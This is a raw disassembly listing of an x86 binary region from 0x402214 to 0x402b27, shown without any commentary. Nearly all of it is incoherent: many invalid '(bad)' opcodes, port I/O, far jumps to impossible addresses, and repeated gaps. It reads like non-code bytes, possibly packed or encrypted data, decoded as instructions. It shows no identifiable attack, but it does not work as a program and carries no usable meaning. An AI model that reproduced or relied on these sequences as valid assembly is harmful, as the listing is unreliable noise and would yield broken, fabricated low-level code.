  402214:	leave  
  402215:	arpl   ax,sp
  402217:	jne    0x402271
  402219:	xchg   ebx,eax
  40221a:	in     eax,dx
  40221b:	jmp    0x4021a9
  40221d:	imul   esi,esp,0xffffffbf
  402220:	rcr    BYTE PTR [edi-0x20],0x75
  402224:	nop
  402225:	ds data16 clc 
  402228:	fcom   QWORD PTR [ebx+0x26]
  40222b:	or     ecx,DWORD PTR [ebx+ebp*2+0x432875e0]
  402232:	(bad)  
  402234:	mov    WORD PTR [ebx-0x20],gs
  402237:	jne    0x4021bd
  402239:	push   ebx
  40223a:	(bad)  
  40223c:	adc    ebp,DWORD PTR [esi]
  40223e:	mov    dl,0xc2
  402240:	xchg   esp,eax
  402241:	imul   eax,DWORD PTR [esi-0x75],0xfffffff0
  402245:	jmp    0x52a00b01
  40224a:	les    ecx,FWORD PTR [ebp-0xa4f0b7]
  402250:	popa   
  402251:	arpl   bx,dx
  402253:	retf   0x6af0
  402256:	or     eax,DWORD PTR [ebp-0x488cca34]
  40225c:	mov    WORD PTR [ecx+eiz*8+0x3],ss
	...
  402273:	add    bl,cl
  402275:	fdivp  st(1),st
  402277:	(bad)  [esi]
  402279:	pop    esp
  40227a:	pop    esi
  40227b:	call   0xe89df185
  402280:	cmp    DWORD PTR [eax+0x59],ebx
  402283:	js     0x40223c
  402285:	xchg   ebx,eax
  402286:	loope  0x402284
  402288:	jecxz  0x40220e
  40228a:	xchg   DWORD PTR gs:[esp+edx*4+0x64497ae1],ecx
  402292:	outs   dx,BYTE PTR cs:[esi]
  402294:	cmp    BYTE PTR ds:0x948d0473,0x62
  40229b:	mov    edi,0x3e19990
  4022a0:	fcom   QWORD PTR [ecx+edx*4-0x1e6aca25]
  4022a7:	add    edx,DWORD PTR ds:0xe1e80dda
  4022ad:	dec    eax
  4022ae:	or     DWORD PTR [eax-0x71],ebp
  4022b1:	xchg   ebp,eax
  4022b2:	loope  0x402236
  4022b4:	push   eax
  4022b5:	cdq    
  4022b6:	in     al,dx
  4022b7:	add    ecx,DWORD PTR [esp+eiz*4+0x252453e1]
  4022be:	loope  0x4022c3
  4022c0:	mov    WORD PTR ds:0x94b6dc24,ds
  4022c6:	mov    dh,0x71
  4022c8:	xor    BYTE PTR [esp+esi*1-0x10],dl
  4022cc:	sbb    ecx,edx
  4022ce:	leave  
  4022cf:	out    0x99,eax
  4022d1:	inc    esp
  4022d2:	cdq    
  4022d3:	pop    ebp
  4022d4:	(bad)  
  4022d5:	xchg   ebp,eax
  4022d6:	loope  0x40225a
	...
  4022ec:	enter  0x68a8,0x41
  4022f0:	hlt    
  4022f1:	push   ebx
  4022f2:	sbb    al,0xe8
  4022f4:	in     al,0x8b
  4022f6:	call   0xebfb:0xfc538c04
  4022fd:	or     cl,BYTE PTR [eax]
  4022ff:	jae    0x4022f4
  402301:	push   ebx
  402302:	(bad)
  402307:	test   al,0x8f
  402309:	push   ebx
  40230a:	jge    0x4022fd
  40230c:	out    0x98,eax
  40230e:	cmc    
  40230f:	push   esi
  402310:	mov    bl,0x9f
  402312:	ror    BYTE PTR [esi+0x3d],1
  402315:	dec    eax
  402316:	idiv   DWORD PTR [edi+eiz*4-0x54c215c5]
  40231d:	push   ebx
  40231e:	sub    edx,DWORD PTR [ecx]
  402320:	mov    bl,0xc9
  402322:	lock cs sbb eax,0x879cf73c
  402329:	cmp    eax,DWORD PTR [eax]
  40232b:	sbb    al,0x6b
  40232d:	push   ebx
  40232e:	sub    esi,DWORD PTR [ecx]
  402330:	jae    0x4022fb
  402332:	in     al,0x1
  402334:	adc    DWORD PTR [eax+ecx*1-0x1f368d17],0x11
  40233c:	pop    ebx
  40233d:	push   ebx
  40233e:	imul   ecx
  402340:	jb     0x40230b
  402342:	add    BYTE PTR [ecx],al
  402344:	pop    ecx
  402345:	dec    ebp
  402346:	mul    esi
  402348:	(bad)  
  402349:	push   edi
  40234a:	push   ebx
  40234b:	mov    al,0x4d
  40234d:	cwde   
  40234e:	or     BYTE PTR [eax+eax*1],bh
	...
  402361:	add    BYTE PTR [eax],al
  402363:	add    BYTE PTR [edi+0x304c8b40],dh
  402369:	push   ebx
  40236a:	jnp    0x40235d
  40236c:	xor    cl,cl
  40236e:	add    cl,dl
  402370:	push   edx
  402371:	ds or  cl,ch
  402374:	jbe    0x4023ca
  402376:	shr    DWORD PTR [ebx+0x725c5313],0xe3
  40237d:	push   ds
  40237e:	dec    ebp
  40237f:	icebp  
  402380:	mov    WORD PTR [eax+ecx*1],ss
  402383:	jmp    0x29a30817
  402388:	rcl    BYTE PTR [edi-0x1e],1
  40238b:	add    ch,dh
  40238d:	xchg   esi,eax
  40238e:	rol    edx,0xe9
  402391:	xchg   esi,eax
  402392:	pop    ebp
  402393:	mov    edx,DWORD PTR [ecx]
  402395:	loop   0x40238b
  402397:	mov    esp,eax
  402399:	dec    esi
  40239a:	or     BYTE PTR [ebp-0x3f],0x35
  40239e:	push   es
  40239f:	push   ecx
  4023a0:	je     0x402412
  4023a2:	or     ch,BYTE PTR [ebx]
  4023a4:	gs inc esi
  4023a6:	mov    ds:0xb382659,eax
  4023ab:	repz (bad) 
  4023ad:	fld    st(1)
  4023af:	ret    0x969d
  4023b2:	pop    ebp
  4023b3:	mov    edx,DWORD PTR [ecx-0x1f]
  4023b6:	pop    edi
  4023b7:	mov    esp,eax
  4023b9:	dec    edx
  4023ba:	repz mov ebp,DWORD PTR [eax]
  4023bd:	dec    esi
  4023be:	or     BYTE PTR [ebp-0x7b],0x37
  4023c2:	or     dh,bl
  4023c4:	leave  
  4023c5:	ficom  DWORD PTR [esi-0x37]
	...
  4023dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023dd:	dec    ecx
  4023de:	not    DWORD PTR [esi+ebx*8+0x69]
  4023e2:	pop    esi
  4023e3:	push   edi
  4023e4:	faddp  st(4),st
  4023e6:	add    ah,bh
  4023e8:	out    dx,al
  4023e9:	mov    WORD PTR [eax],ds
  4023eb:	sub    esp,DWORD PTR [ebp+0x560c75ce]
  4023f1:	xchg   edi,eax
  4023f2:	sti    
  4023f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023f4:	ds (bad) 
  4023f7:	add    DWORD PTR [ebp-0x29],esp
  4023fa:	push   esi
  4023fb:	leave  
  4023fc:	out    0x4c,eax
  4023fe:	not    DWORD PTR [esi+ebx*4+0x6c]
  402402:	mov    eax,esp
  402404:	loope  0x4023e8
  402406:	pop    edi
  402407:	push   ebx
  402408:	int    0x96
  40240a:	or     DWORD PTR [eax],eax
  40240c:	and    eax,0x1d087d39
  402411:	es idiv edi
  402414:	and    cl,ah
  402416:	jne    0x402420
  402418:	mov    WORD PTR [edx-0x1b21d4cb],es
  40241e:	or     al,0x1
  402420:	mov    WORD PTR [ebx],?
  402422:	jae    0x402438
  402424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402425:	ror    edx,1
  402427:	loop   0x4023fe
  402429:	mov    dh,0x6f
  40242b:	or     BYTE PTR [ebx+0x7a],cl
  40242e:	jno    0x4024a5
  402430:	cwde   
  402431:	xor    DWORD PTR [edi],0xb3a68cfe
  402437:	sub    edx,edi
  402439:	mov    ch,0x8
  40243b:	cmp    eax,DWORD PTR [ecx+edi*8]
  40243e:	jmp    0x402440
	...
  402454:	push   ecx
  402455:	fnstenv [edx+0x4]
  402458:	pop    ebp
  402459:	cmp    esi,DWORD PTR [esi]
  40245b:	dec    BYTE PTR [ebx+0x6fe47d1]
  402461:	cmp    BYTE PTR [ecx],ah
  402463:	mov    BYTE PTR [eax-0x7cba8eca],dl
  402469:	ret    
  40246a:	or     BYTE PTR [edx],bh
  40246c:	int    0x66
  40246e:	ds adc dh,bh
  402471:	cmp    eax,0x7e6ac910
  402476:	addr16 aad 0xc7
  402479:	xor    cl,BYTE PTR [ebp-0x37]
  40247c:	dec    esi
  40247d:	aaa    
  40247e:	or     edx,DWORD PTR [ebp+0x7]
  402481:	dec    edi
  402482:	mov    ah,al
  402484:	inc    esp
  402485:	mov    es,WORD PTR [esi+0x57]
  402488:	inc    ebx
  402489:	call   0x3e467f82
  40248e:	jae    0x4024d5
  402490:	xor    DWORD PTR [ebp-0x7febfeb8],esi
  402496:	loopne 0x402423
  402498:	daa    
  402499:	jp     0x4024d0
  40249b:	mov    esp,DWORD PTR [ecx+0x1445b437]
  4024a1:	cmp    ecx,DWORD PTR [ebx]
  4024a3:	add    BYTE PTR [esp+edx*4+0x359c367a],cl
  4024aa:	and    esi,esp
  4024ac:	push   ecx
  4024ad:	dec    edi
  4024ae:	out    dx,al
  4024af:	lods   eax,DWORD PTR ds:[esi]
  4024b0:	dec    ecx
  4024b1:	dec    edi
  4024b2:	(bad)  
  4024b3:	lods   eax,DWORD PTR ds:[esi]
  4024b4:	or     BYTE PTR [ecx+edi*2+0x4e],0x0
	...
  4024cc:	jecxz  0x402461
  4024ce:	sbb    al,0xe8
  4024d0:	mov    ecx,DWORD PTR [edx]
  4024d2:	and    al,0xe8
  4024d4:	push   es
  4024d5:	test   al,0xb9
  4024d7:	jnp    0x40253a
  4024d9:	push   edx
  4024da:	(bad)  
  4024db:	lods   eax,DWORD PTR ds:[esi]
  4024dc:	dec    ecx
  4024dd:	dec    edi
  4024de:	jns    0x4024ef
  4024e0:	je     0x402483
  4024e2:	xchg   edi,eax
  4024e3:	ds mov al,0x1d
  4024e6:	mov    esp,0x9a814e4
  4024eb:	jp     0x402526
  4024ed:	push   ecx
  4024ee:	jecxz  0x40253e
  4024f0:	call   0x39d7:0x729d51d
  4024f7:	xor    esp,DWORD PTR [eax-0x7bc1d17c]
  4024fd:	xor    esp,DWORD PTR [ecx]
  4024ff:	jns    0x4024d2
  402501:	push   ecx
  402502:	imul   eax,DWORD PTR [eax],0x7b05da06
  402508:	iret   
  402509:	xchg   ebp,eax
  40250a:	scas   al,BYTE PTR es:[edi]
  40250b:	inc    ebp
  40250c:	(bad)  
  40250d:	pop    ebp
  40250e:	and    esi,edi
  402510:	pop    ebx
  402511:	jmp    0x594dfc80
  402516:	cmc    
  402517:	in     al,0x4b
  402519:	push   eax
  40251a:	xor    ch,BYTE PTR [edi]
  40251c:	and    ch,BYTE PTR [si]
  40251f:	loopne 0x4024fd
  402521:	dec    edi
  402522:	push   esp
  402523:	or     al,0x24
  402525:	retf   0x4cb
  402528:	mov    WORD PTR [ecx],ds
  40252a:	mov    eax,ds:0xe1271413
  40252f:	add    eax,DWORD PTR [eax]
	...
  402541:	add    BYTE PTR [eax],al
  402543:	add    BYTE PTR [edi+ecx*2+0x3c803c08],cl
  40254a:	dec    ebp
  40254b:	mov    bh,0xef
  40254d:	dec    edi
  40254e:	sub    DWORD PTR [esp+eiz*8],0xe89d7d4f
  402555:	mov    ah,cl
  402557:	jmp    0x1608c0eb
  40255c:	outs   dx,DWORD PTR ds:[esi]
  40255d:	sbb    eax,0xc9ef794d
  402562:	cld    
  402563:	xchg   ecx,eax
  402564:	dec    si
  402566:	div    DWORD PTR [esi+0x1]
  402569:	(bad)  
  40256b:	outs   dx,BYTE PTR ds:[esi]
  40256c:	gs dec eax
  40256e:	neg    esp
  402570:	out    0x4f,eax
  402572:	jge    0x4025cd
  402574:	test   al,0x20
  402576:	not    BYTE PTR [esi-0x51]
  402579:	dec    edi
  40257a:	jge    0x4025c9
  40257c:	mov    eax,0x8fe9e1ac
  402581:	dec    edi
  402582:	jge    0x402571
  402584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402585:	cwde   
  402586:	loope  0x402571
  402588:	(bad)  
  402589:	in     al,0xf7
  40258b:	mov    ah,0x9b
  40258d:	and    DWORD PTR [ebp-0x8b091e9],ecx
  402593:	mov    ecx,0x16f5f967
  402598:	outs   dx,DWORD PTR ds:[esi]
  402599:	dec    edi
  40259a:	jge    0x4025b1
  40259c:	outs   dx,DWORD PTR ds:[esi]
  40259d:	leave  
  40259e:	lock je 0x4025b6
  4025a1:	ds idiv dh
  4025a4:	outs   dx,BYTE PTR ds:[esi]
  4025a5:	in     al,0xe0
  4025a7:	test   DWORD PTR [eax],0x0
	...
  4025b9:	add    BYTE PTR [eax],al
  4025bb:	add    BYTE PTR [ebp+0x4f],ch
  4025be:	imul   esi
  4025c0:	in     al,0x9c
  4025c2:	loopne 0x402618
  4025c4:	pusha  
  4025c5:	dec    edi
  4025c6:	not    DWORD PTR [ebx-0x78]
  4025c9:	mov    esp,0x94c92134
  4025ce:	not    DWORD PTR [eax+ebx*4+0x3c]
  4025d2:	mov    bl,0x0
  4025d4:	dec    edi
  4025d5:	xor    dh,bh
  4025d7:	or     ebp,ebp
  4025d9:	xor    DWORD PTR [ebp-0xc],edi
  4025dc:	(bad)  
  4025de:	lock inc eax
  4025e1:	mov    al,ds:0x322fabe0
  4025e6:	mul    DWORD PTR [ebx]
  4025e8:	int    0x31
  4025ea:	jge    0x4025e4
  4025ec:	or     eax,0x1afff50e
  4025f1:	xor    bh,BYTE PTR [ebp+0x8]
  4025f4:	std    
  4025f5:	repz (bad) 
  4025f7:	call   FWORD PTR [edx+0x1e]
  4025fa:	retf   
  4025fb:	pop    ebx
  4025fc:	sub    al,0x59
  4025fe:	add    BYTE PTR [eax],al
  402600:	mov    al,ds:0x7183e41f
  402605:	addr16 pop edi
  402607:	mov    esi,eax
  402609:	inc    esi
  40260a:	add    al,al
  40260c:	rcr    DWORD PTR [edi+ecx*8+0x892b500],1
  402613:	add    BYTE PTR [esi+0x33],bh
  402616:	mov    edi,DWORD PTR [ebp-0x53]
  402619:	xchg   edi,eax
  40261a:	jge    0x402623
  40261c:	pop    ds
  40261d:	xchg   ebx,eax
  40261e:	or     al,BYTE PTR [eax]
	...
  402634:	jne    0x402675
  402636:	pop    es
  402637:	sub    DWORD PTR [eax],0x4a
  40263a:	or     DWORD PTR [ebp+0x72],esi
  40263d:	xor    BYTE PTR [eax],cl
  40263f:	add    DWORD PTR [ebp-0x6e],esp
  402642:	jecxz  0x402646
  402644:	dec    esi
  402645:	or     BYTE PTR [ecx+0xa926cca],cl
  40264b:	add    al,ch
  40264d:	fdivr  st(4),st
  40264f:	push   eax
  402650:	idiv   DWORD PTR [edi-0x623f00f8]
  402656:	div    DWORD PTR [ebp+0x3d]
  402659:	cmp    ch,BYTE PTR [edx+0x39225e9]
  40265f:	ror    BYTE PTR [eax+esi*8+0x63d18d79],0x3c
  402667:	push   0xffffff8c
  402669:	enter  0xf44f,0xbc
  40266d:	loope  0x40267b
  40266f:	call   FWORD PTR [ecx+0x875e86b]
  402675:	push   esp
  402676:	xchg   ecx,ebp
  402678:	mov    WORD PTR [ebx],?
  40267a:	add    al,0xc0
  40267c:	cmp    DWORD PTR [edi-0x73],0x5f3bf47d
  402683:	inc    esi
  402684:	pop    fs
  402686:	rol    BYTE PTR [ecx],1
  402688:	pop    ecx
  402689:	cmp    eax,0x3cd47d8c
  40268e:	pop    edi
  40268f:	cmp    al,BYTE PTR [edi]
  402691:	adc    esp,0x4a135c40
  402697:	std    
	...
  4026ac:	ret    
  4026ad:	mov    dh,0x85
  4026af:	clc    
  4026b0:	or     ecx,edi
  4026b2:	rcl    BYTE PTR [eax+0x5b],cl
  4026b5:	push   ecx
  4026b6:	or     ebp,DWORD PTR [edx-0x74]
  4026b9:	ficomp WORD PTR [edi+0x10]
  4026bc:	mov    ds:0x43e8d710,eax
  4026c1:	in     al,0xc
  4026c3:	add    BYTE PTR [edi-0x1cf5af85],al
  4026c9:	shl    DWORD PTR [ecx],cl
  4026cb:	std    
  4026cc:	xor    DWORD PTR [esi+0x25],0xffffffff
  4026d0:	addr16 aas 
  4026d2:	test   BYTE PTR [ebp-0x68],al
  4026d5:	xor    cl,bl
  4026d7:	je     0x40266a
  4026d9:	sahf   
  4026da:	pop    edi
  4026db:	clc    
  4026dc:	adc    edi,DWORD PTR [ebx]
  4026de:	call   0x15e37f58
  4026e3:	jmp    0xc7c46274
  4026e8:	xchg   edi,eax
  4026e9:	jnp    0x40274a
  4026eb:	sbb    al,0xf
  4026ed:	xchg   esp,eax
  4026ee:	ins    BYTE PTR es:[edi],dx
  4026ef:	cld    
  4026f0:	(bad)  
  4026f1:	sar    edi,0x8c
  4026f4:	leave  
  4026f5:	lods   al,BYTE PTR ds:[esi]
  4026f6:	and    DWORD PTR [ebx+ebp*1],esi
  4026f9:	(bad)  
  4026fa:	std    
  4026fb:	loopne 0x402696
  4026fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026fe:	into   
  4026ff:	push   esi
  402700:	mov    BYTE PTR [ebp+0x3c],cl
  402703:	or     al,0x24
  402705:	jae    0x4026c5
  402707:	loopne 0x402714
  402709:	in     eax,dx
  40270a:	test   al,0xc5
  40270c:	cwde   
  40270d:	xchg   esp,eax
  40270e:	xor    al,0x8d
	...
  402724:	call   0x8d4c3b3b
  402729:	xchg   esp,eax
  40272a:	loope  0x4026af
  40272c:	popa   
  40272d:	fwait
  40272e:	xchg   BYTE PTR [esi],dl
  402730:	mov    edi,0xb0420db
  402735:	xlat   BYTE PTR ds:[ebx]
  402736:	stc    
  402737:	ins    DWORD PTR es:[edi],dx
  402738:	mov    WORD PTR [ebp-0xc],cs
  40273b:	test   edx,0x39e0d1c6
  402741:	mov    al,ds:0x3c84566e
  402746:	pop    ebp
  402747:	loope  0x4026fc
  402749:	dec    esp
  40274a:	sub    ch,al
  40274c:	jl     0x4026e2
  40274e:	or     al,ah
  402750:	pop    ss
  402751:	fs adc ch,ah
  402754:	aad    0x9a
  402756:	loope  0x40275b
  402758:	mov    WORD PTR [ebx+0x4b],fs
  40275b:	push   esp
  40275c:	cwde   
  40275d:	adc    eax,0xfe1e1233
  402762:	sub    al,0x82
  402764:	jle    0x40270c
  402766:	lock repnz pushf 
  402769:	ss jp  0x8ae138f0
  402770:	int    0x94
  402772:	(bad)  
  402774:	loope  0x4027e4
  402776:	and    dh,BYTE PTR [esi]
  402778:	pop    es
  402779:	cmp    DWORD PTR [eax],ecx
  40277b:	sahf   
  40277c:	sbb    dl,dl
  40277e:	add    dh,dh
  402780:	(bad)  
  402781:	pop    ds
  402782:	jne    0x402779
  402784:	push   es
  402785:	ficomp DWORD PTR [eax]
  402787:	repnz add BYTE PTR [eax],al
	...
  40279a:	add    BYTE PTR [eax],al
  40279c:	inc    eax
  40279d:	rcl    DWORD PTR [eax],0x62
  4027a0:	loopne 0x4027f7
  4027a2:	loop   0x402785
  4027a4:	jge    0x402739
  4027a6:	sub    eax,0x89490c6
  4027ab:	jb     0x402731
  4027ad:	adc    DWORD PTR [eax+0x60],ecx
  4027b0:	push   ecx
  4027b1:	xchg   esp,eax
  4027b2:	cmp    ebp,DWORD PTR [ebx-0x611fc9b5]
  4027b8:	inc    eax
  4027b9:	in     al,dx
  4027ba:	shr    DWORD PTR [ebx+0x625d949c],0xdc
  4027c1:	out    0x8b,eax
  4027c3:	or     al,0x90
  4027c5:	xchg   esp,eax
  4027c6:	jge    0x4027b6
  4027c8:	rcl    cl,cl
  4027ca:	add    BYTE PTR [eax],bh
  4027cc:	inc    eax
  4027cd:	aad    0x8
  4027cf:	push   0x2d
  4027d1:	cwde   
  4027d2:	or     ah,dh
  4027d4:	mov    dl,BYTE PTR [ebx+0x4d]
  4027d7:	cmc    
  4027d8:	and    ch,bl
  4027da:	dec    ecx
  4027db:	jmp    0x4140e9b2
  4027e0:	mov    eax,ds:0x16e90832
  4027e5:	ins    DWORD PTR es:[edi],dx
  4027e6:	idiv   DWORD PTR [ebx+ecx*4-0x77b9f0c4]
  4027ed:	xchg   esp,eax
  4027ee:	or     edx,DWORD PTR [ecx]
  4027f0:	iret   
  4027f1:	out    0xe0,eax
  4027f3:	out    dx,al
  4027f4:	arpl   WORD PTR [ebx-0x9],cx
  4027f7:	jb     0x402831
  4027f9:	dec    ebx
  4027fa:	jge    0x4027ed
  4027fc:	mov    esi,0xe193c
	...
  402811:	add    BYTE PTR [eax],al
  402813:	add    BYTE PTR [eax-0x6c6b086c],dl
  402819:	out    0xe0,eax
  40281b:	add    BYTE PTR [ebx+0x32],ah
  40281e:	or     BYTE PTR [eax],al
  402820:	ficom  WORD PTR [edi+0x53]
  402823:	leave  
  402824:	ja     0x4027be
  402826:	or     BYTE PTR [ebp-0x52],dl
  402829:	inc    esp
  40282a:	pop    ebx
  40282b:	xor    DWORD PTR [eax+0x2a750898],0x52
  402832:	dec    ebp
  402833:	or     BYTE PTR [edi+ebx*8],al
  402836:	dec    ecx
  402837:	add    BYTE PTR [esi+0x580004b4],dh
  40283d:	xchg   ebx,eax
  40283e:	iret   
  40283f:	inc    ebp
  402840:	and    DWORD PTR [eax],esp
  402842:	inc    eax
  402843:	inc    ecx
  402844:	cmc    
  402845:	imul   edi,DWORD PTR [ebp+0x8],0xedf3cd
  40284c:	in     eax,0x1d
  40284e:	sar    bh,1
  402850:	cwde   
  402851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402852:	loopne 0x402807
  402854:	sbb    edx,DWORD PTR [edi-0x29e2fcf8]
  40285a:	pop    ebx
  40285b:	call   0x37965e
  402860:	pop    esi
  402861:	maskmovq mm6,(bad)
  402862:	div    DWORD PTR [ebp-0x53]
  402865:	test   eax,esp
  402867:	mov    ebp,0xff08970b
  40286c:	fcomp  DWORD PTR [edx+0x30efe85b]
  402872:	or     BYTE PTR [eax],al
  402874:	xor    al,0xb4
  402876:	add    BYTE PTR [ecx+0x0],dh
	...
  40288c:	in     eax,dx
  40288d:	iret   
  40288e:	or     BYTE PTR [ebp+ebx*4+0x69],dh
  402892:	jge    0x40289c
  402894:	cmp    eax,0xc2fff2fa
  402899:	push   ds
  40289a:	retf   
  40289b:	pop    ebx
  40289c:	lods   al,BYTE PTR ds:[esi]
  40289d:	push   ebx
  40289e:	add    BYTE PTR [eax],al
  4028a0:	cmp    BYTE PTR [edi],bl
  4028a2:	in     al,0x83
  4028a4:	test   eax,0x8c685f69
  4028a9:	cmp    BYTE PTR [eax+eax*1],cl
  4028ac:	mov    WORD PTR [ebx-0x6ca4045b],ss
  4028b2:	test   BYTE PTR [ebp+0x50],al
  4028b5:	mov    edi,0xfcd7e728
  4028ba:	or     al,BYTE PTR [eax]
  4028bc:	mov    ecx,0x3b16e23d
  4028c1:	jmp    0xe5cc93ae
  4028c6:	or     al,0xff
  4028c8:	mov    eax,ds:0x23006133
  4028cd:	inc    ecx
  4028ce:	in     al,dx
  4028cf:	dec    ebx
  4028d0:	int    0x3b
  4028d2:	mov    es,eax
  4028d4:	xchg   ebp,eax
  4028d5:	adc    ebp,0x75
  4028d8:	or     BYTE PTR [ecx+eiz*2-0x5],dl
  4028dc:	add    edi,ebx
  4028de:	int3   
  4028df:	inc    ebp
  4028e0:	clc    
  4028e1:	cmp    ecx,DWORD PTR [ebx]
  4028e3:	add    BYTE PTR [edx+ebp*8+0x3b4d4be1],cl
  4028ea:	loopne 0x402919
  4028ec:	pop    ss
  4028ed:	inc    ebx
  4028ee:	add    BYTE PTR [ebp+0x0],0x0
	...
  402902:	add    BYTE PTR [eax],al
  402904:	test   BYTE PTR [eax-0x2c],bl
  402907:	jg     0x4028dc
  402909:	retf   0x4213
  40290c:	nop
  40290d:	dec    eax
  40290e:	lock imul ecx,DWORD PTR [eax+ebp*8+0x635c084a],0x3b4d4d1c
  40291a:	aam    0x32
  40291c:	mov    ah,0x7
  40291e:	aad    0xff
  402920:	mov    ds:0x9174cb36,eax
  402925:	les    ecx,FWORD PTR [edi-0x4]
  402928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402929:	inc    ebx
  40292a:	mov    bh,al
  40292c:	nop
  40292d:	mov    esi,0xa9f90015
  402932:	add    DWORD PTR [ebp+0x78],0x4ecace94
  402939:	nop
  40293a:	loope  0x402972
  40293c:	pop    ss
  40293d:	cmp    BYTE PTR [edx-0x15633678],dh
  402943:	ret    
  402944:	loopne 0x4028d5
  402946:	popa   
  402947:	sbb    al,0x8c
  402949:	mov    edi,0x948c9bfb
  40294e:	loope  0x402953
  402950:	out    0x5b,eax
  402952:	and    ecx,DWORD PTR [eax]
  402954:	mov    WORD PTR [esi-0x4173961f],?
  40295a:	loop   0x4029c5
  40295c:	mov    WORD PTR [esi-0x6bf3941f],?
  402962:	loope  0x402967
  402964:	sbb    edi,DWORD PTR [edi+0xebf9]
	...
  40297a:	add    BYTE PTR [eax],al
  40297c:	fsubr  QWORD PTR [esi]
  40297e:	loope  0x402983
  402980:	pop    ss
  402981:	ins    BYTE PTR es:[edi],dx
  402982:	or     al,ah
  402984:	dec    edi
  402985:	shr    dl,0x30
  402988:	in     al,0xf8
  40298a:	add    DWORD PTR [ebx],0xffffff8c
  40298d:	or     al,0xe0
  40298f:	add    ecx,DWORD PTR [esp+edx*4-0x703134c6]
  402996:	loope  0x4029ce
  402998:	pop    es
  402999:	cmp    BYTE PTR [edx+0x46],bh
  40299c:	test   BYTE PTR [ebp+0x149157a1],bl
  4029a2:	mov    ecx,0x399b3903
  4029a7:	add    ecx,DWORD PTR [esp+edx*4-0x7031351f]
  4029ae:	loope  0x40298c
  4029b0:	and    DWORD PTR [ecx+ecx*2-0x1e6c5668],ebx
  4029b7:	adc    BYTE PTR [eax+ecx*2-0x5c1af14b],0xe1
  4029bf:	add    ecx,DWORD PTR [edi+edx*4-0x67b0a3f8]
  4029c6:	mov    esi,0xb0926429
  4029cb:	jmp    0x3048be5f
  4029d0:	dec    ebp
  4029d1:	xchg   ecx,eax
  4029d2:	or     BYTE PTR [esp+edx*1+0x3b258b39],bh
  4029d9:	mov    ebx,0x478f9308
  4029de:	jge    0x4029d1
	...
  4029f4:	aaa    
  4029f5:	and    ebp,ebp
  4029f7:	jmp    0x7608c58b
  4029fc:	gs in  al,0x58
  4029ff:	shl    DWORD PTR [edx+0x19def74a],1
  402a05:	shl    ah,cl
  402a07:	xor    DWORD PTR [eax+0x47],ebx
  402a0a:	jge    0x4029d9
  402a0c:	aaa    
  402a0d:	ret    0xd100
  402a10:	mov    cl,0x31
  402a12:	or     cl,ch
  402a14:	call   0xf4c1:0xe6e57d54
  402a1b:	shr    DWORD PTR [edi+0x4a],0xf7
  402a1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a20:	mov    ds:0x1aeae354,eax
  402a25:	shl    ah,cl
  402a27:	mov    al,ds:0x340890ca
  402a2c:	or     edi,DWORD PTR [ecx]
  402a2e:	pop    ebx
  402a2f:	jb     0x4029c6
  402a31:	cwde   
  402a32:	(bad)  
  402a33:	fld    DWORD PTR [edx-0x188c8cc4]
  402a39:	inc    edi
  402a3a:	(bad)  
  402a3b:	jmp    0xeaa2be69
  402a40:	and    DWORD PTR [edx+eiz*2+0x89437ea],edx
  402a47:	jmp    0xe1bd725b
  402a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a4d:	inc    eax
  402a4e:	in     al,dx
  402a4f:	add    BYTE PTR [ebp+0x35038193],ah
  402a55:	xlat   BYTE PTR ds:[ebx]
  402a56:	push   esp
  402a57:	push   0x0
	...
  402a69:	add    BYTE PTR [eax],al
  402a6b:	add    BYTE PTR [ebp-0x7d],dh
  402a6e:	loopne 0x402aa5
  402a70:	rcl    BYTE PTR [eax-0x70d976f8],1
  402a76:	bound  eax,QWORD PTR [eax]
  402a78:	call   DWORD PTR [edx-0x6ef0ff9e]
  402a7e:	bound  eax,QWORD PTR [eax]
  402a80:	mov    bl,BYTE PTR [edi-0x6f7fd820]
  402a86:	or     BYTE PTR [ebx],cl
  402a88:	jne    0x402a6e
  402a8a:	daa    
  402a8b:	mov    esi,esi
  402a8d:	inc    esi
  402a8e:	popa   
  402a8f:	add    BYTE PTR [edi],cl
  402a91:	xchg   ebx,eax
  402a92:	bound  eax,QWORD PTR [eax]
  402a94:	fist   WORD PTR [eax+ebx*2+0x8358de8]
  402a9b:	add    BYTE PTR [esi+ecx*8-0x1c1af500],ch
  402aa2:	sub    al,0xff
  402aa4:	push   esi
  402aa5:	xchg   esp,eax
  402aa6:	loopne 0x402a63
  402aa8:	rcl    DWORD PTR [edx+0x3b06ff08],1
  402aae:	mov    esp,0xcf92e5e4
  402ab3:	add    ebp,DWORD PTR [edx]
  402ab5:	push   0xfffffff7
  402ab7:	(bad)  
  402ab8:	(bad)  
  402ab9:	fwait
  402aba:	div    DWORD PTR [ebx]
  402abc:	or     eax,0xe500ebf4
  402ac1:	push   ecx
  402ac2:	or     edi,edi
  402ac4:	or     ch,BYTE PTR [edx-0x9]
  402ac7:	sub    esi,ebp
  402ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402aca:	dec    ebx
  402acb:	or     BYTE PTR [edx+0x5bc8c3],ch
	...
  402ae1:	add    BYTE PTR [eax],al
  402ae3:	add    ah,ch
  402ae5:	push   eax
  402ae6:	add    BYTE PTR [eax],al
  402ae8:	lock adc eax,0x8c1e53e4
  402aee:	add    BYTE PTR [ebx+0x74d3a28c],al
  402af4:	adc    esi,0x5e
  402af7:	or     BYTE PTR [edx+ebp*4-0x7973ff29],ah
  402afe:	pop    esi
  402aff:	add    al,0x74
  402b01:	push   es
  402b02:	xlat   BYTE PTR ds:[ebx]
  402b03:	add    BYTE PTR [esi+esi*2-0x681c17e2],cl
  402b0a:	or     eax,DWORD PTR [eax]
  402b0c:	mov    DWORD PTR [ebp+ecx*8-0x79f773fc],0xeb700dec
  402b17:	out    dx,eax
  402b18:	push   ebx
  402b19:	(bad)  
  402b1a:	cmp    DWORD PTR [edi+0xf],edx
  402b1d:	or     DWORD PTR [edx],edi
  402b1f:	dec    eax
  402b20:	int    0x3b
  402b22:	or     esi,DWORD PTR [ecx+eiz*4+0x36]
  402b26:	pop    es
  402b27:	push   edi
